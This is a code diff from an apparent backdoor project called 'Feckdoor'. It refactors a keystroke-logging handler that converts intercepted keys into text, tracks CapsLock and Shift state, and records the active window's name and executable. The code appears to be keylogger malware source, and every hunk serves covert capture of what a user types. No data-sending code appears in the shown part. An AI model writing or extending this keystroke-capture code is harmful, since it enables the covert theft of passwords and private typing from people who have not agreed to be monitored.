@@ -21,18 +21,24 @@ namespace Feckdoor.InputLog
 		internal void OnKeyboardInput(object? sender, KeyboardInputEventArgs args)
 		{
 			bool capsLock = (User32.GetKeyState(0x14) & 0xffff) != 0;
-			string currentKey = Vk2String(args.VkCode, args.ScanCode, args.Modifier.HasFlag(ModifierKey.Alt));
+
+			string currentKey = "";
+			if (args.VkCodeEnum.GetVkName(args.Modifier, ref currentKey))
+			{
+				if (currentKey.Equals("CapsLock", StringComparison.OrdinalIgnoreCase))
+				{
+					if (capsLock)
+						currentKey = "CapsLock: Off";
+					else
+						currentKey = "CapsLock: On";
+				}
+			}
+			else
+				currentKey = Vk2String(args.VkCode, args.ScanCode, args.Modifier.HasFlag(ModifierKey.Alt));
 
 			if (Config.TheConfig.InputLog.AutoCapitalize)
 				currentKey = (capsLock ^ args.Modifier.HasFlag(ModifierKey.Shift)) ? currentKey.ToUpper() : currentKey.ToLower();
 
-			if (args.VkCodeEnum.GetVkName(args.Modifier, ref currentKey) && currentKey.Equals("CapsLock", StringComparison.OrdinalIgnoreCase))
-			{
-				if (capsLock)
-					currentKey = "CapsLock: Off";
-				else
-					currentKey = "CapsLock: On";
-			}
 
 			if (Config.TheConfig.InputLog.SuppressModifierKey && ModifierKeysString.Any(key => currentKey.Equals(key, StringComparison.Ordinal)))
 				return;
@@ -116,11 +122,6 @@ namespace Feckdoor.InputLog
 				Log.Warning(e, "Exception during getting active window info.");
 				return new ActiveWindowInfo { Name = Config.TheConfig.InputLog.FallbackWindowName, Executable = Config.TheConfig.InputLog.FallbackWindowExecutableName };
 			}
-		}
-
-		private string GetCurrentIMEString()
-		{
-		
 		}
 
 		protected virtual void Dispose(bool disposing)
